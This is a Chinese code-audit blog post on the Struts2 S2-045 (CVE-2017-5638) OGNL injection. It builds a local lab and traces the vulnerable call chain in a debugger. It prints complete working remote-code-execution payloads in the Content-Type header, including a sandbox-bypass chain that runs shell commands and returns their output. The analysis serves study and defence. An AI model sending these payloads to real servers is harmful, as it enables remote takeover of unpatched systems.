---
title: 代码审计 | Struts2 —— S2-045 OGNL 注入与三重沙箱绕过分析
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_fk2k.png
categories:
  - [代码审计, struts2]
tags:
  - 代码审计
  - Java
  - Struts2
  - S2-045
  - OGNL
  - RCE
  - CVE-2017-5638
abbrlink: c3d8e7f2
date: 2026-05-12 16:30:00
---
# 代码审计 | Struts2 —— S2-045 OGNL 注入与三重沙箱绕过分析

> CVE-2017-5638 · Apache Struts2 · Jakarta 多部分解析器 RCE

---

## 目录

- [环境搭建](#环境搭建)
- [漏洞触发验证](#漏洞触发验证)
- [Payload 逐段拆解](#payload-逐段拆解)
- [手动搭建复现环境](#手动搭建复现环境)
- [正常请求流程梳理](#正常请求流程梳理)
- [调试验证 OGNL 执行](#调试验证-ognl-执行)
- [源码调用栈分析](#源码调用栈分析)
- [沙箱机制与绕过过程](#沙箱机制与绕过过程)
- [总结](#总结)

---

## 环境搭建

用 vulhub 直接起环境，省事：

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/struts2/s2-045
docker-compose up -d
```

起来之后访问 `http://127.0.0.1:8080`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_gaj5.png)

这里用 yakit 抓个包：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_1uuw.png)

这是正常的响应包：

```html
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzlnKBM4ABUiDAvZG
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_giax.png)

---

## 漏洞触发验证

先把 `Content-Type` 那一行整个换成下面这个，做个 OGNL 数学计算验证，确认表达式是否被执行：

```
Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

发包，命令成功执行并回显：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_fk2k.png)

---

## Payload 逐段拆解

先把这个 payload 拆开看，整体是一个 OGNL 表达式链，塞在 `Content-Type` 头里。

### `%{...}` 是什么

`%{...}` 是 Struts2 的 OGNL 表达式标记，整个链用 `.` 串联，分几段。

OGNL 里用 `(expr1).(expr2)` 这种形式来串联多个表达式，每个括号是一个独立的子表达式，点号把它们连起来顺序执行。点号串联的返回值是最后一个表达式的结果，前面的表达式主要是为了副作用（比如赋值、修改状态）。

举个简单例子：

```java
(#a=1).(#b=2).(#a+#b)  // 返回 3，但前两步赋值的副作用都生效了
```

### 完整 payload 注释版

```
%{
  (#test='multipart/form-data').                         // 伪造正常的 multipart 请求，骗过 Content-Type 检测

  (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).         // 获取 OGNL 最高权限的 MemberAccess 对象

  (#_memberAccess?                                       // 三元判断：_memberAccess 存在（低版本）？
    (#_memberAccess=#dm)                                 //   是 → 直接替换为最高权限，完成沙箱逃逸
    :((#container=#context['com.opensymphony.xwork2.ActionContext.container']).  //   否 → 从 context 拿 IoC 容器
      (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)). // 从容器获取 OgnlUtil 实例
      (#ognlUtil.getExcludedPackageNames().clear()).     //   清空包名黑名单
      (#ognlUtil.getExcludedClasses().clear()).          //   清空类黑名单
      (#context.setMemberAccess(#dm)))).                 //   设置最高权限，完成沙箱逃逸

  (#cmd='id').                                           // 要执行的命令

  (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))). // 判断是否 Windows 系统

  (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})). // 根据系统构造命令数组

  (#p=new java.lang.ProcessBuilder(#cmds)).              // 创建 ProcessBuilder 准备起子进程

  (#p.redirectErrorStream(true)).                        // stderr 合并到 stdout，避免漏输出

  (#process=#p.start()).                                 // 启动子进程执行命令

  (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())). // 拿到 HTTP Response 的输出流

  (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)). // 把命令执行结果 copy 到响应流

  (#ros.flush())                                         // 刷新输出流，回显到 HTTP 响应
}
```

> **补充：为什么要先判断 `#_memberAccess`？**
> 
> Struts2 不同版本对 OGNL 上下文的暴露方式不一样。低版本中 `_memberAccess` 可以直接从上下文访问并赋值，而高版本加了额外保护，所以 payload 里做了三元判断来兼容两种情况。这也是公开 payload 里那段看起来很绕的结构的原因。

---

## 手动搭建复现环境

为了更好地理解漏洞触发链，自己搭一个最小化的复现环境来单步调试。

### pom.xml

核心依赖就两个，struts2-core 和 Jakarta 的 multipart 解析器：

```xml
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.3.28</version>
</dependency>

<!-- Jakarta multipart 解析器依赖 -->
<dependency>
    <groupId>commons-fileupload</groupId>
    <artifactId>commons-fileupload</artifactId>
    <version>1.3.1</version>
</dependency>
```

### web.xml — Struts2 的入口

```xml
<filter>
    <filter-name>struts2</filter-name>
    <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
</filter>
<filter-mapping>
    <filter-name>struts2</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
```

### src/main/resources/struts.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"
        "http://struts.apache.org/dtds/struts-2.3.dtd">
<struts>
    <!-- 指定文件上传解析器用 Jakarta，漏洞触发点就在这个解析器里 -->
    <!-- Struts2 有两个解析器可选：jakarta 和 cos，默认就是 jakarta -->
    <!-- 这里显式声明一下，换成 cos 的话漏洞就触发不了 -->
    <constant name="struts.multipart.parser" value="jakarta"/>

    <!-- namespace="/" 表示根路径，extends="struts-default" 继承默认配置 -->
    <!-- 里面包含了一堆拦截器，文件上传相关的拦截器也在里面 -->
    <package name="default" namespace="/" extends="struts-default">
        <action name="upload" class="com.demo.UploadAction">
            <!-- execute() 返回 SUCCESS 跳这里 -->
            <result name="success">/upload.jsp</result>
            <!-- input 这个 result 比较关键 -->
            <!-- Jakarta 解析器抛异常后 Struts2 会把请求导向 input 结果 -->
            <!-- 在这个过程中才触发了错误消息的 OGNL 求值 -->
            <result name="input">/upload.jsp</result>
        </action>
    </package>
</struts>
```

### UploadAction.java

```java
package com.demo;

import com.opensymphony.xwork2.ActionSupport;
import java.io.File;

// 继承 ActionSupport，拿到默认的 execute()、validate() 等基础实现
public class UploadAction extends ActionSupport {

    private File upload;               // 接收文件本体，名字对应表单的 name="upload"
    private String uploadFileName;     // 接收原始文件名，命名规则固定：字段名+FileName
    private String uploadContentType;  // 接收文件的 MIME 类型，命名规则固定：字段名+ContentType

    @Override
    public String execute() throws Exception {
        // 啥都不干，直接返回 SUCCESS 跳到 upload.jsp，够触发漏洞就行
        return SUCCESS;
    }

    // 下面全是标准 getter/setter，fileUpload 拦截器靠反射调这些 setter 注入数据
    public File getUpload() { return upload; }
    public void setUpload(File upload) { this.upload = upload; }
    public String getUploadFileName() { return uploadFileName; }
    public void setUploadFileName(String uploadFileName) { this.uploadFileName = uploadFileName; }
    public String getUploadContentType() { return uploadContentType; }
    public void setUploadContentType(String uploadContentType) { this.uploadContentType = uploadContentType; }
}
```

核心就一点：这个类本身没有任何业务逻辑，就是一个空壳，作用是让 `fileUpload` 拦截器能通过反射找到对应的 setter 完成注入。**漏洞在拦截器执行之前就已经触发了，跟这个 Action 里写什么没有关系。**

### upload.jsp

```jsp
<%@ page contentType="text/html;charset=UTF-8" %>
<html>
<body>
<!-- 提交到 /upload，对应 struts.xml 里 name="upload" 的 Action -->
<!-- 文件上传必须用 POST -->
<!-- 关键：告诉浏览器用 multipart 格式编码，Struts2 才会用 Jakarta 解析器处理 -->
<form action="/upload" method="post" enctype="multipart/form-data">
    <!-- name="upload" 对应 Action 里的 upload 字段 -->
    <input type="file" name="upload"/>
    <input type="submit" value="上传"/>
</form>
</body>
</html>
```

最关键的是 `enctype="multipart/form-data"`，没有这个请求就是普通表单，`Content-Type` 就是 `application/x-www-form-urlencoded`，Jakarta 解析器不会介入，漏洞触发不了。

访问 `http://localhost:8080/upload.jsp`，显示正常的表单界面：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_lxfy.png)

---

## 正常请求流程梳理

先把正常请求的完整调用链搞清楚，这样后面看漏洞触发点的时候就知道是哪里出了问题。

`struts-default.xml` 里有自带的拦截器栈：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_djyw.png)

正常一次文件上传请求的完整流程：

```
浏览器访问 http://localhost:8080/upload.jsp
        ↓
    upload.jsp 显示上传表单
        ↓
    点击上传，表单提交到 action="upload"
        ↓
    web.xml 里 StrutsPrepareAndExecuteFilter 拦截所有请求 /*
        ↓
    检测请求头 Content-Type 包含 multipart/form-data
        ↓
    包装成 MultiPartRequestWrapper，同时调用 JakartaMultiPartRequest.parse() 解析文件
        ↓
    struts.xml 里找到 name="upload" 对应 com.demo.UploadAction
        ↓
    按顺序执行 defaultStack 拦截器栈
        ↓
    fileUpload 拦截器检测到是 MultiPartRequestWrapper
        ↓
    反射找 Action 里的 setUpload()、setUploadFileName()、setUploadContentType()
        ↓
    把解析好的文件数据注入到对应字段
        ↓
    UploadAction.execute() 返回 SUCCESS
        ↓
    struts.xml 里 result name="success" 指向 /upload.jsp
        ↓
    回到 upload.jsp
```

---

## 调试验证 OGNL 执行

### 先确认 OGNL 表达式确实被执行了

修改数据包，把 `Content-Type` 改成：

```
Content-Type: %{1+1} multipart/form-data
```

因为直接这样看不到回显，需要在 jsp 里面添加：

```jsp
<%@ taglib prefix="s" uri="/struts-tags" %>
<s:actionerror/>
```

`<s:actionerror/>` 的作用是把 `ActionError` 里的内容渲染到页面上：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_ttsz.png)

然后就看到返回包里包含计算结果 2：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_sfx1.png)

表达式被 OGNL 成功执行了，这里漏洞验证完毕。

---

## 源码调用栈分析

还是先根据 `web.xml` 里的 Struts2 监听器 `StrutsPrepareAndExecuteFilter` 里的 `doFilter` 为入口断点：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_hdhp.png)

在这里面，进入 `request = prepare.wrapRequest(request)`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_8fdo.png)

进入 `request = dispatcher.wrapRequest(request)`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_98kw.png)

```java
String content_type = request.getContentType();
```

取出了请求包里的 `ContentType`，这里也就是 `%{1+1} multipart/form-data`。

接着是：

```java
if (content_type != null && content_type.contains("multipart/form-data")) {
```

判断 `Content-Type` 是否包含 `multipart/form-data`。**注意这里是直接判断是否包含字段，而不是严格比对**，所以 `%{1+1} multipart/form-data` 也能通过这个检测。

然后进入：

```java
request = new MultiPartRequestWrapper(mpr, request, getSaveDir(), provider, disableRequestAttributeValueStackLookup);
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_aupd.png)

进入 `multi.parse(request, saveDir)`，我们的表达式还在 request 里面，`saveDir` 是保存的临时路径。

`parse` 里就是检测格式的地方：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_cu66.png)

明显格式不对，所以会抛出异常：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_3cw7.png)

这整个异常信息里带着我们的 payload：

```
content type header is %{1+1} multipart/form-data
```

这个 `e.getMessage()` 的值就是这整串字符串，接下来会被传进 `buildErrorMessage()`：

```java
String errorMessage = buildErrorMessage(e, new Object[]{});
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_drj1.png)

这里面返回了 `LocalizedTextUtil.findText`，其中参数 `e` 就是包含 payload 的错误信息：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_z41s.png)

然后进入另一个 `findText` 方法，这里 `defaultMessage` 是错误信息：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_65tz.png)

经过一段非常长的查找，最后 `indexedTextName` 还是 null，进入：

```java
result = getDefaultMessage(aTextName, locale, valueStack, args, defaultMessage);
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512170040302.png)

这里 `aTextName` 是 `struts.messages.upload.error.InvalidContentTypeException`（错误信息里截取的部分），`defaultMessage` 是：

```
the request doesn't contain a multipart/form-data or multipart/mixed stream,
content type header is %{1+1} multipart/form-data
```

错误信息的另一部分，也包含了我们的表达式。

然后来到下面这行：

```java
MessageFormat mf = buildMessageFormat(TextParseUtil.translateVariables(message, valueStack), locale);
```

`buildMessageFormat` 只是把结果格式化成消息，不重要。**重点是 `TextParseUtil.translateVariables(message, valueStack)`，这个就是会处理并计算 OGNL 表达式的地方。**

> **注意**：断点进入时不要直接进入，会默认进入 `buildMessageFormat` 方法，需要手动点击进入 `translateVariables` 方法里面。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_6wto.png)

进入看到了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_m5wv.png)

这和之前看 S2-016 代码审计看到的是一样的，都是 OGNL 的处理逻辑——把表达式 `%{}` 里的内容提取出来，然后进入 OGNL 计算，得出 `2`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_7a91.png)

### 漏洞根因总结

这整体看来基本和 S2-016 一样，只不过触发点不一样。代码会对 `Content-Type` 里的内容检测是否包含 `multipart` 字段，但后面的内容格式不对从而触发了异常抛出，而这个异常抛出会经过 OGNL 的检测计算逻辑，导致触发了漏洞。

S2-045 这个案例特别典型，因为它利用的是错误处理逻辑——开发者压根没想到异常消息也是用户可控的，防御意识完全没有覆盖到这里，这也是为什么这类漏洞危害这么大。

> **补充：为什么连错误、异常都要经过 OGNL 检测？**
>
> 这是 Struts2 的国际化机制设计导致的，不是专门针对错误消息做 OGNL 求值，而是所有文本消息统一走这一套处理流程：
>
> ```
> 任何要显示给用户的文本
>     → 统一走 LocalizedTextUtil.findText()
>         → 统一走 getDefaultMessage()
>             → 统一走 TextParseUtil.translateVariables()
>                 → 统一做 OGNL 求值
> ```
>
> 设计者本来想的是把错误信息做成国际化友好的提示，比如把`文件 test.jpg 上传失败，大小超过 10MB`这种可读的消息渲染出来，而不是直接甩一堆 Java 异常堆栈给用户看。一个美化 UI 的小功能，变成了高危 RCE，挺经典的安全反例。

---

## 沙箱机制与绕过过程

### 第一步：直接 RCE 尝试，失败

`1+1` 证明了确实有漏洞，尝试构造 RCE 代码：

```
Content-Type: %{@java.lang.Runtime@getRuntime().exec('calc')}multipart/form-data
```

但是 calc 并没有执行：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_h710.png)

调试一下看看具体是哪里出了问题。

可以看到 payload 依然被正常提取出来了，没有被拦截：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_kcds.png)

在这里可以看到传入的 `var` 是正常的 payload，但是返回的值却是 null：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_oxry.png)

说明 OGNL 里的检测肯定没有通过，检测机制在这里面：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_a2rs.png)

然后断点进入：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_v42a.png)

然后是 `node.getValue`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_1rmn.png)

然后这里的 `_hasConstantValue` 是 false，进入 `getValueBody(context, source)`，一大段都是处理索引属性的特殊情况：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_0ax2.png)

来到最后一段的 `_children[i].getValue()`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_pu9y.png)

然后就是又来到了这里，这似乎是因为 AST 树是嵌套的，每一层节点都要经过这个方法：

```
ASTChain.getValueBody()             ← 第一次，处理整个链式调用
    → _children[0].getValue()
        → ASTStaticMethod.getValueBody()  ← 第二次，处理 @Runtime@getRuntime()
            → _children[0].getValue()
                → ASTMethod.getValueBody()  ← 第三次，处理 exec('calc')
```

就像俄罗斯套娃，外层节点调用内层节点，每层都要走一遍 `evaluateGetValueBody`，payload 被一层层拆解执行，直到最里层才真正触发方法调用和 `isAccessible()` 检查。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_ojdj.png)

然后在这个 `getValueBody` 方法里面

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_1e0e.png)

payload 的参数方法被拆解了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_8axd.png)

`callStaticMethod` 里：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_onen.png)

然后就是 `ma.callStaticMethod(context, targetClass, methodName, args)`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_7xvo.png)

这里是拦截点，判断 `DENY_METHOD_EXECUTION` 这个 flag。`exec: null，e: false`，走进了 `if (!e)` 分支，方法执行没有被拦截。

继续跟进 `callStaticMethodWithDebugInfo()`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_zyp6.png)

进入，`super.callStaticMethod` 查找方法，相当于找到 `getRuntime()` 这个方法对象：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_y1da.png)

跟进 `callAppropriateMethod()`，看到了 `isMethodAccessible()`，如果没有通过就会直接抛出异常，不继续执行下面的代码，通过了才走到 `invokeMethod()` 真正执行 `getRuntime()`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_uec7.png)

而 `isMethodAccessible()` 就是沙箱检查，必须通过才能继续：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_tqp1.png)

进入看看：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_jlub.png)

再次进入：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_c7he.png)

最后发现只有一个 `return _memberAccess`，而 `_memberAccess` 不是一个普通的参数，而是一个对象。`.getMemberAccess()` 之后就是 `.isAccessible()`，这里是真正的检测方法。

这两段拿到这两个 Class 对象用来后面的黑名单对比：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_i49y.png)

三个检测：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_oqtr.png)

```java
// 第一个：检查包名黑名单，比如 java.lang、ognl 这些包是否被禁止
// 第二个：检查调用者的类是否在黑名单里，比如 Runtime.class
// 第三个：检查方法声明所在的类是否在黑名单里，比如 Runtime.class
```

三个都没拦截才能走到最后：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_tfwh.png)

```java
// 父类的基础访问检查，比如 private/public 修饰符
```

先看看会不会被检测到。`isPackageExcluded` 这个方法里面有两个检测，第一个没有检测到，但是第二个检测到了，被拦截了，这就是 RCE 没有正常执行的原因：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_j0o3.png)

这是对三个黑名单的检测

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_w4ms.png)

---

### 第二步：尝试 clear() 清空黑名单

针对这三个黑名单的检测，一般的审计都是要分析具体是什么被检测了、黑名单是什么。但是这个 payload 绕过不一样，非常暴力，直接把黑名单清空。

问题是：为什么能把黑名单清空，这个思路是怎么发现的？

在 `SecurityMemberAccess` 这个类里面有个 set 方法：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_2bld.png)

那是不是意味着可以直接 set 一个空的内容给黑名单？

理论上可以，但实际上不行，因为在 payload 里面是拿不到 `SecurityMemberAccess` 这个对象的。

`SecurityMemberAccess` 没有注册到 Struts2 的 IoC 容器里，`OgnlUtil` 注册了：

```java
// OgnlUtil 在容器里注册了，可以通过 getInstance() 拿到
#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)

// SecurityMemberAccess 没有注册，容器里找不到，拿不到实例
#container.getInstance(@com.opensymphony.xwork2.ognl.SecurityMemberAccess@class) // 返回 null
```

`SecurityMemberAccess` 是在每次请求时由 Struts2 内部创建的，不是单例，不在容器里管理，没有公开的获取途径，所以 payload 里没办法直接拿到它的实例。

选中 set 方法看是谁调用了它，找到了 `OgnlUtil` 里面：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_dfjq.png)

可以看到这里还有其他的黑名单被创建，而 set 的参数是直接用的固定的值，这些值在初始化的时候就被建立：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_1oab.png)

`OgnlUtil` 类里面是有 set 和 get 方法的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_0z5l.png)

注意到 get 方法返回的是一个 `Set` 对象，`Set` 对象是自带 `clear()` 方法的，这样就能清空黑名单了。

**总结一下整个闭环**：`SecurityMemberAccess` 是由 `OgnlUtil` 创建的，`OgnlUtil` 对象是可以获取的，赋值的黑名单绑定的是 `OgnlUtil` 里的字段，只要把 `OgnlUtil` 里的字段清空，`SecurityMemberAccess` 的黑名单就也没了，而 `OgnlUtil` 里刚好有 get 方法获取这个字段，`Set` 对象自带 `clear()` 方法，这样就成了一个闭环：

```
OgnlUtil（容器里可获取）
    → 创建 SecurityMemberAccess
    → 把自己的 excludedPackageNames 引用传进去（同一块内存）
    → OgnlUtil 暴露了 getExcludedPackageNames() 方法
    → 拿到 Set 引用
    → Set 自带 clear()
    → 清空这块内存
    → SecurityMemberAccess 里的黑名单也空了
    → isPackageExcluded() 永远返回 false
    → java.lang.Runtime 放行
    → exec('calc') 执行
→ 弹计算器
```

根据这个思路构造 payload 试试：

```
Content-Type: %{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#ognlUtil.getExcludedPackageNamePatterns().clear()).(@java.lang.Runtime@getRuntime().exec('calc'))}multipart/form-data
```

结果没有成功：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_58ge.png)

看来分析错了，这是高版本的绕过机制，现在这个版本不适合，还有其他沙箱没有绕过。

通过日志分析，还是识别并拦截了对 `java.lang.Runtime` 的调用：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_9x7r.png)

对比了一下没有 `clear()` 的报错日志，发现是一样的，也就是说 `clear()` 的作用没有效果。经过调试，一直在那三个检测函数上循环，然后找到了被检测的地方：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_cqd0.png)

```java
clazz 是 java.lang.Class
```

这个判断是**硬编码**的，不是从黑名单里读的，`clear()` 清空黑名单对这里没有任何影响。

所以 `Runtime` 被拦截不是因为黑名单，而是因为访问 `Runtime` 时涉及到了 `Class` 对象，被这个硬编码的检测直接拦截了，`clear()` 根本解决不了这个问题。

---

### 第三步：尝试反射修改 `allowStaticMethodAccess`

注意硬编码里有个条件 `!allowStaticMethodAccess`，如果 `allowStaticMethodAccess` 是 `true`，这个检测就不会拦截：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_l1ml.png)

跟进看这个字段在哪里定义，找 `public SecurityMemberAccess(boolean method)`，找到了 `OgnlUtil` 里创建对象：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_gf8j.png)

发现 `OgnlUtil` 里也只是：

```java
private boolean allowStaticMethodAccess;
```

没有定义 `false`，但是 Java 里 `boolean` 类型的字段如果没有显式赋值，默认就是 `false`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_nw99.png)

所以下一步就是想办法把 `allowStaticMethodAccess` 反射为 `true`。因为是私有的，需要反射修改：

```java
(#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')).
(#f.setAccessible(true)).
(#f.set(#_memberAccess,true))
```

构造完整 payload：

```
POST /upload HTTP/1.1
Host: localhost:8080
Content-Type: %{(#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')).(#f.setAccessible(true)).(#f.set(#_memberAccess,true)).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(@java.lang.Runtime@getRuntime().exec('calc'))}multipart/form-data
Content-Length: 0
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_mrco.png)

依然没有成功，然后发现在 `isClassExcluded` 里被拦截了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_j1j5.png)

查看黑名单发现：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_jq4s.png)

`SecurityMemberAccess` 本身也在类黑名单里，所以对它用反射直接被拦截了。还是死循环：

```
对 _memberAccess 用反射
    → isClassExcluded(SecurityMemberAccess)
    → SecurityMemberAccess 在黑名单里
    → 被拦截
```

这条路也走不通。

---

### 第四步：绕过 SecurityMemberAccess 本身

既然不能改 `SecurityMemberAccess` 里面的内容，那能不能绕过 `SecurityMemberAccess` 本身？

因为这一整个检测都是在 `SecurityMemberAccess` 的 `isAccessible` 方法里的。还记得当时调试的代码是：

```java
context.getMemberAccess().isAccessible(...)
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_svzj.png)

`context.getMemberAccess()` 返回的就是 `SecurityMemberAccess` 对象

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_99ml.png)

然后再执行 `SecurityMemberAccess` 里的 `isAccessible` 检测方法。注意这里是通过字段 `_memberAccess` 获取的：

那能不能直接反射改掉这个字段呢？

`SecurityMemberAccess` 是 Struts2 自定义的安全检测拦截对象，是通过继承 `DefaultMemberAccess` 实现的

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_dpjc.png)

而 `DefaultMemberAccess` 是 OGNL 自带的：

`DefaultMemberAccess` 的 `isAccessible` 方法里没有任何拦截：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_6ta2.png)

找到创建的地方，在 `OgnlContext` 里：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_uxy1.png)

虽然传入的是 `false`，这就意味着：

```java
// public  直接 true
// false，private 不行
// false，protected 不行
```

就这么简单。而 `Runtime.getRuntime()` 和 `exec()` 都是 `public` 方法，所以直接放行，不影响漏洞利用。

**思路就是把 `_memberAccess` 换成 `DefaultMemberAccess` 即可：**

```java
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#_memberAccess=#dm).
(@java.lang.Runtime@getRuntime().exec('calc'))
```

构造完整 payload：

```
POST /upload HTTP/1.1
Host: localhost:8080
Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(@java.lang.Runtime@getRuntime().exec('calc'))}multipart/form-data
Content-Length: 0
```

**成功弹出计算器！**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_51zk.png)

这意味着 `(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)` 没有被检测到才能执行。访问的是 `ognl.OgnlContext` 这个类，包名是 `ognl`，黑名单里有 `ognl`，按理说应该被拦截。但是这里访问的是**静态字段**不是方法，走的检测路径不一样，这个版本对静态字段的访问检测没有对静态方法那么严格，所以能拿到 `DEFAULT_MEMBER_ACCESS`，拿到之后替换 `_memberAccess`，后续所有检测全部失效，直接执行 `exec('calc')`。

---

## 总结

### 漏洞触发链

```
Content-Type 包含 %{...} 且格式不合法
    → Jakarta 解析器抛异常
    → e.getMessage() 带出 Content-Type 值
    → buildErrorMessage() 无过滤传递
    → LocalizedTextUtil.findText()
    → getDefaultMessage()
    → TextParseUtil.translateVariables()
    → OGNL 求值
```

### 沙箱绕过思路演进

```
直接执行命令 → SecurityMemberAccess 拦截
    ↓
